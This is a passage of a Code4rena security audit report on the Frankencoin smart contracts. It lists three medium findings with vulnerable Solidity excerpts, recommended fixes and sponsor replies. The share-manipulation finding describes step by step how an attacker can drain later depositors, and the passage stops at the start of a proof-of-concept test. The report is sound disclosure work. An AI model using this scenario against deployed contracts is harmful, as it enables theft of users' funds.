href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/941\">[M-01] Function <code>restructureCapTable()</code> in <code>Equity.sol</code> not functioning as expected </a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/941\">decade</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/992\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/991\">EloiManuel</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/989\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/987\">lukino</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/972\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/939\">ak1</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/919\">0xkaju</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/913\">karanctf</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/909\">silviaxyz</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/896\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/895\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/887\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/875\">Arz</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/844\">Udsen</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/826\">marwen</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/819\">0xDACA</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/812\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/799\">Satyam_Sharma</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/767\">Jerry0x</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/757\">zhuXKET</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/730\">BPZ</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/721\">kenta</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/720\">zzebra83</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/708\">Kek</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/706\">Lalanda</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/665\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/662\">PNS</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/649\">lil_eth</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/619\">Mukund</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/564\">peakbolt</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/560\">circlelooper</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/523\">Jiamin</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/466\">John</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/451\">parlayan_yildizlar_takimi</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/404\">cccz</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/397\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/395\">Tricko</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/341\">Juntao</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/333\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/317\">anodaram</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/283\">jasonxiale</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/250\">nobody2018</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/233\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/226\">markus_ether</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/186\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/159\">0xWeiss</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/137\">HaCk0</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/116\">J4de</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/106\">kodyvim</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/98\">volodya</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/82\">deadrxsezzz</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/70\">ToonVH</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/65\">RedTiger</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/36\">mrpathfindr</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/25\">ravikiranweb3</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/19\">0xWaitress</a></em></p>\n<p>Incorrect typo in function <code>restructureCapTable()</code> leading to only burning tokens of first address of <code>addressToWipe</code> array argument.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here, in L313, addressToWipe[0] only takes first address of the array. While ignoring the rest and also since first address’s tokens are burned it will fail <code>addressesToWipe</code> array has more than one addresses.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function restructureCapTable(address[] calldata helpers, address[] calldata addressesToWipe) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(zchf.equity() &lt; MINIMUM_EQUITY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        checkQualified(msg.sender, helpers);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i = 0; i&lt;addressesToWipe.length; i++){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address current = addressesToWipe[0];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _burn(current, balanceOf(current));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change <code>address current = addressesToWipe[0];</code> ==> <code>address current = addressesToWipe[i];</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/941#issuecomment-1528893633\">luziusmeisser (Frankencoin) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-02-position-limit-could-be-fully-reduced-to-zero-by-clones\" style=\"position:relative;\"><a href=\"#m-02-position-limit-could-be-fully-reduced-to-zero-by-clones\" aria-label=\"m 02 position limit could be fully reduced to zero by clones permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/932\">[M-02] POSITION LIMIT COULD BE FULLY REDUCED TO ZERO BY CLONES</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/932\">Josiah</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/876\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/838\">0xDACA</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/807\">Kumpa</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/789\">Emmanuel</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/693\">Diana</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/679\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/671\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/646\">lil_eth</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/422\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/301\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/273\">Nyx</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/249\">nobody2018</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/248\">nobody2018</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/243\">RaymondFam</a></em></p>\n<h3 id=\"lines-of-code-1\" style=\"position:relative;\"><a href=\"#lines-of-code-1\" aria-label=\"lines of code 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/MintingHub.sol#L126\">https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/MintingHub.sol#L126</a> <br><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L97-L101\">https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L97-L101</a></p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>A newly opened position could have its limit fully reduced to zero as soon as the cooldown period has elapsed.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>As seen in the function below, a newly opened position with <code>0</code> Frankencoin minted could have its <code>limit</code> turn <code>0</code> if the function parameter, <code>_minimum</code>, is inputted with an amount equal to <code>limit</code>. In this case, <code>reduction</code> is equal to <code>0</code>, making <code>limit - _minimum = 0</code> while the cloner is assigned <code>reduction + _minimum = 0 + limit = limit</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L97-L101\">Position.sol#L97-L101</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function reduceLimitForClone(uint256 _minimum) external noChallenge noCooldown alive onlyHub returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 reduction = (limit - minted - _minimum)/2; // this will fail with an underflow if minimum is too high</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        limit -= reduction + _minimum;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return reduction + _minimum;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>With the limit now fully allocated to the cloner, the original position owner is left with zero limit to mint Frankencoin after spending 1000 Frankencoin to open this position. This situation could readily happen especially when it involves popular position contracts.</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It is recommended position contract charging fees to cloners. Additionally, a reserve limit should be left untouched allocated solely to the original owner to be in line with the context of position opening.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/932#issuecomment-1516037713\">0xA5DF (lookout) commented</a>:</strong></p>\n<blockquote>\n<p>Setting this one as primary since it shows how a single clone can reduce the remaining limit to zero.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/932#issuecomment-1528894234\">luziusmeisser (Frankencoin) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Charging clones a fee payable to the original is an interesting idea!</p>\n<p>If the position comes with a high enough fee, this should not be relevant in practice as the limit will not be reached or new positions being created if there is enough demand. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-manipulation-of-total-share-amount-might-cause-future-depositors-to-lose-their-assets\" style=\"position:relative;\"><a href=\"#m-03-manipulation-of-total-share-amount-might-cause-future-depositors-to-lose-their-assets\" aria-label=\"m 03 manipulation of total share amount might cause future depositors to lose their assets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/915\">[M-03] Manipulation of total share amount might cause future depositors to lose their assets</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/915\">MiloTruck</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/880\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/845\">DedOhWale</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/632\">yixxas</a></em></p>\n<p>In the <code>Equity</code> contract, the <code>calculateSharesInternal()</code> function is used to determine the amount of shares minted whenever a user deposits Frankencoin:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L266-L270\">Equity.sol#L266-L270</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateSharesInternal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">capitalBefore</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">investment</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newTotalShares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">ONE_DEC18</span><span class=\"mtk1\"> ? </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">ONE_DEC18</span><span class=\"mtk1\"> : </span><span class=\"mtk11\">_mulD18</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_cubicRoot</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_divD18</span><span class=\"mtk1\">(</span><span class=\"mtk12\">capitalBefore</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">investment</span><span class=\"mtk1\">, </span><span class=\"mtk12\">capitalBefore</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newTotalShares</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Note that the return value is the amount of shares minted to the depositor.</p>\n<p>Whenever the total amount of shares is less than <code>1000e18</code>, the depositor will receive <code>1000e18 - totalShares</code> shares, regardless of how much Frankencoin he has deposited. This functionality exists to mint <code>1000e18</code> shares to the first depositor.</p>\n<p>However, this is a vulnerability as the total amount of shares can decrease below <code>1000e18</code> due to the <code>redeem()</code> function, which burns shares:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L275-L278\">Equity.sol#L275-L278</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">canRedeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proceeds</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">calculateProceeds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The following check in <code>calculateProceeds()</code> only ensures that <code>totalSupply()</code> is never below <code>1e18</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L293\">Equity.sol#L293</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">ONE_DEC18</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;too many shares&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// make sure there is always at least one share</span></span></span></code></pre>\n<p>As such, if the total amount of shares decreases below <code>1000e18</code>, the next depositor will receive <code>1000e18 - totalShares</code> shares instead of an amount of shares proportional to the amount of Frankencoin deposited. This could result in a loss or unfair gain of Frankencoin for the depositor.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>If the total amount of shares ever drops below <code>1000e18</code>, the next depositor will receive a disproportionate amount of shares, resulting in an unfair gain or loss of Frankencoin.</p>\n<p>Moreover, by repeatedly redeeming shares, an attacker can force the total share amount remain below <code>1000e18</code>, causing all future depositors to lose most of their deposited Frankencoin.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider the following scenario:</p>\n<ul>\n<li>Alice deposits 1000 Frankencoin (<code>amount = 1000e18</code>), gaining <code>1000e18</code> shares in return.</li>\n<li>After 90 days, Alice is able to redeem her shares.</li>\n<li>\n<p>Alice calls <code>redeem()</code> with <code>shares = 1</code> to redeem 1 share:</p>\n<ul>\n<li>The total amount of shares is now <code>1000e18 - 1</code>.</li>\n</ul>\n</li>\n<li>\n<p>Bob deposits 1000 Frankencoin (<code>amount = 1000e18</code>). In <code>calculateSharesInternal()</code>:</p>\n<ul>\n<li><code>totalShares &#x3C; 1000 * ONE_DEC18</code> evalutes to true.</li>\n<li>Bob receives <code>newTotalShares - totalShares = 1000e18 - (1000e18 - 1) = 1</code> shares.</li>\n</ul>\n</li>\n</ul>\n<p>Although Bob deposited 1000 Frankencoin, he received only 1 share in return. As such, all his deposited Frankencoin can be redeemed by Alice using her shares. Furthermore, Alice can cause the next depositor after Bob to also receive 1 share by redeeming 1 share, causing the total amount of shares to become <code>1000e18 - 1</code> again.</p>\n<p>Note that the attack described above is possbile as long as an attacker has sufficient shares to decrease the total share amount below <code>1000e18</code>.</p>\n<p>The following Foundry test demonstrates the scenario above:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span 